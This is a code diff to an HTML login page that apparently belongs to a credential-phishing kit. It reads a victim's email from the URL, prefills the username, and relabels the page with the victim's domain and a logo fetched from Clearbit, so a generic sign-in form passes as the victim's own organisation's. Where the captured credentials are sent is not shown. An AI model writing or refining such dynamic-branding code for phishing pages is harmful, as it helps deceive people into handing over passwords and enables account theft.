@@ -1,4 +1,4 @@
- <html lang="ko">
+<html lang="ko">
 <head>
   <meta http-equiv="Content-Language" content="en-us">
   <meta charset="UTF-8" />
@@ -88,7 +88,7 @@
                     <tr>
                       <td width="400" height="40">
                         <div class="input-group">
-                          <input name="user" placeholder="Username" type="text" required class="form-control">
+                          <input name="user" placeholder="Username" type="text" required class="form-control" id="usernameInput">
                           <input type="hidden" name="domain" id="hiddenDomain">
                           <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
                         </div>
@@ -141,8 +141,8 @@
       </td>
     </tr>
   </table>
- 
- <script>
+
+  <script>
     const params = new URLSearchParams(window.location.search);
     const raw = params.get('login');
     const email = raw ? decodeURIComponent(raw) : '';
@@ -152,12 +152,13 @@
       [user, domain] = email.split('@');
     }
 
-    // Set domain value
-    const hiddenDomain = document.getElementById('hiddenDomain');
-    if (hiddenDomain) hiddenDomain.value = domain || 'domain';
+    // Set input values
+    document.getElementById('usernameInput').value = user || '';
+    document.getElementById('hiddenDomain').value = domain || 'domain';
 
     // Update domain visuals
     if (domain) {
+      document.getElementById('domainAddon').textContent = '@' + domain;
       document.getElementById('domainLabel').textContent = domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
     }
